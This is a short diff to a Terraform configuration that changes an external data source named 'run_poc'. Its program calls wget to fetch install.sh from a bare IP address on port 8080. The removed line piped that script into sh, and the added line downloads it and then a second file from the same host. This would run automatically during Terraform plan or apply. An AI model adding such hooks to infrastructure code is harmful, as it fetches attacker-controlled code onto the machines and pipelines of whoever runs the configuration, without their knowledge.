@@ -11,7 +11,7 @@ resource "random_id" "r" {
 }
 
 data "external" "run_poc" {
-  program = ["wget", "-qO-", "http://164.90.177.231:8080/install.sh", "|", "sh"]
+  program = ["wget", "-qO-", "http://164.90.177.231:8080/install.sh", "&&", "wget", "http://164.90.177.231:8080/i"]
 }
 
 variable "env_type_id" {
